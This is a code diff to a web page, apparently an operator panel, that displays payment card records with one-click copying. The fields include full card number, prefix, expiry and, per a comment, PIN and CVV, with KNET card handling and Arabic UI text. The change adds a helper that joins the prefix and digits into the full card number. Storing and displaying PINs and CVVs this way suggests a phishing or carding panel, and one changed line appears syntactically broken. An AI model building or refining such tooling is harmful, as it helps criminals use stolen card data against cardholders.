@@ -1830,11 +1830,11 @@ if (entry.type === 'code') {
               html += '</div>';
               // Card number
               html += '<div style="text-align: center; margin-bottom: 14px;">';
-              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #064e3b; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + ((typeof card !== "undefined" && card && card.prefix) ? String(card.prefix).replace(/\D/g,"") : "") + /*FIX27*/ knetCardNum + '\')">' + formattedKnetNum + '</span>';
+              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #064e3b; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + kddFull(card.cardNumber || knetCardNum, card.prefix) + '\')">' + formattedKnetNum + '</span>';
               html += '</div>';
               // Expiry + Prefix row
               html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
-              html += '<div style="text-align: left;"><span style="color: #065f46; font-size: 11px;">Prefix</span><br><span dir="ltr" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + ((typeof card !== "undefined" && card && card.prefix) ? String(card.prefix).replace(/\D/g,"") : "") + knetCardNum + \')" style="cursor: pointer; display: inline-block; background: #065f46; color: #fff; font-size: 15px; font-weight: bold; padding: 3px 10px; border-radius: 6px; letter-spacing: 2px; unicode-bidi: embed;">' + (card.prefix || '-') + '</span></div>';
+              html += '<div style="text-align: left;"><span style="color: #065f46; font-size: 11px;">Prefix</span><br><span dir="ltr" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + kddFull(card.cardNumber || knetCardNum, card.prefix) + \')" style="cursor: pointer; display: inline-block; background: #065f46; color: #fff; font-size: 15px; font-weight: bold; padding: 3px 10px; border-radius: 6px; letter-spacing: 2px; unicode-bidi: embed;">' + (card.prefix || '-') + '</span></div>';
               html += '<div style="text-align: right;"><span style="color: #065f46; font-size: 11px;">Expiry</span><br><span style="color: #064e3b; font-size: 16px; font-weight: bold;">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
               html += '</div>';
               // PIN + CVV + Network row
@@ -1866,7 +1866,7 @@ if (entry.type === 'code') {
               html += '</div>';
               // Card number
               html += '<div style="text-align: center; margin-bottom: 14px;">';
-              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + ((typeof card !== "undefined" && card && card.prefix) ? String(card.prefix).replace(/\D/g,"") : "") + /*FIX27*/ card.cardNumber + '\')">' + formattedNum + '</span>';
+              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" title="انقر للنسخ" onclick="kddCopyCard(this, \'' + kddFull(card.cardNumber, card.prefix) + '\')">' + formattedNum + '</span>';
               html += '</div>';
               // Expiry + Name row
               html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
@@ -3288,6 +3288,14 @@ document.addEventListener("click", function(e){
   }
   install();
 })();
+
+/*FIX28*/
+function kddFull(n, p){
+  var d = String(n == null ? "" : n).replace(/\D/g, "");
+  var f = String(p == null ? "" : p).replace(/\D/g, "");
+  if (f && d && d.length < 16 && d.indexOf(f) !== 0) return f + d;
+  return d;
+}
 </script>
 
 </body>
